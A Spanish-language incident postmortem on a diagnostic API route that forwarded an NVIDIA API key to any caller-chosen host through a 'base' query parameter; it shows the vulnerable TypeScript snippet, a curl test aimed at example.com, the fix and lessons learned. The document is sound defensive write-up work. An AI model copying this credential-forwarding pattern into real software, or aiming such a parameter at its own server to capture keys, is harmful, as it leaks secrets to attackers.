# Incidente · 10-sep-2026 · `/api/diagnostico-ia` reenviaba la clave de IA a cualquier host

**Gravedad**: alta — exfiltracion de credencial posible por cualquiera que conociera la URL.
**Estado**: cerrado el 10-sep-2026 a las 15:13 UTC. **Ventana de exposicion: ~19 horas**
(desplegado el 9-sep ~20:05 UTC, retirado el 10-sep 15:13 UTC).
**Datos afectados**: ninguno. La base estaba vacia y no hay datos de personas — reales ni
sinteticos — en el sistema.

## Que pasaba

La ruta `/api/diagnostico-ia` se creo el 9 de septiembre para responder una pregunta legitima:
*¿esta credencial autoriza de verdad la inferencia?* Aceptaba tres parametros por query string
—`op`, `model` y **`base`**— y hacia la llamada con la clave del Worker:

```ts
const base = (q.base || BASE_POR_DEFECTO).replace(/\/$/, '')
const cabeceras = { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' }
const r = await fetch(`${base}${ruta}`, { method: 'POST', headers: cabeceras, ... })
```

**El destino lo elegia quien llamaba.** Bastaba apuntar `?base=` a un servidor propio para
recibir `Authorization: Bearer <NVIDIA_API_KEY>` en las cabeceras.

## Como se comprobo

```
curl -s 'https://alonno-demo.enerby212.workers.dev/api/diagnostico-ia?op=chat&base=https://example.com/v1'
→ {"op":"chat","base":"https://example.com/v1","http":405,"detalle":"<!doctype html>…Example Domain…"}
```

El `405` viene de `example.com`, no de NVIDIA: **la peticion salio de verdad hacia el host
indicado**, con la cabecera puesta.

## Causa raiz

El parametro `base` se anadio el 9-sep para distinguir un endpoint invalido de una credencial
rechazada — un diagnostico util, que funciono: probo que `ai.api.nvidia.com` devuelve 404 y que
el 403 no dependia del endpoint. El fallo no fue anadirlo: **fue no acotar el destino a una lista
blanca cuando el parametro se volvio publico al desplegar.**

Una herramienta de diagnostico heredo la superficie de ataque de un servicio de produccion sin
que nadie lo decidiera. La sonda tenia tarea propia para retirarse antes de la entrega
(`86bbxv2wx`) — pero "antes del 16" no era suficiente: era peligrosa desde el minuto uno.

## Que se hizo

1. Se borro la ruta entera y se redesplego (version `8a27829c`). Verificado: la URL ya no
   devuelve el JSON del proxy, y `/api/salud` sigue en verde.
2. Se abrio este registro.

## Que queda pendiente, y es de Rene

**Rotar la clave `nvidia-nim`.** Estuvo expuesta 19 horas en una URL publica. No hay indicio de
uso indebido —el Worker no guardaba logs de peticion en ese periodo, asi que **tampoco se puede
demostrar que no lo hubo**, y esa es la razon honesta para rotarla—.

## Que cambia para no repetirlo

- **Ninguna ruta desplegada acepta un destino de red por parametro.** Si hace falta comparar
  endpoints, la lista va en el codigo como constante.
- Una herramienta de diagnostico con credenciales **no se despliega**: se ejecuta desde la
  maquina de desarrollo, donde su superficie es una sola persona.
- La lista de comprobacion del dia de entrega incluye enumerar las rutas publicadas y justificar
  cada una.
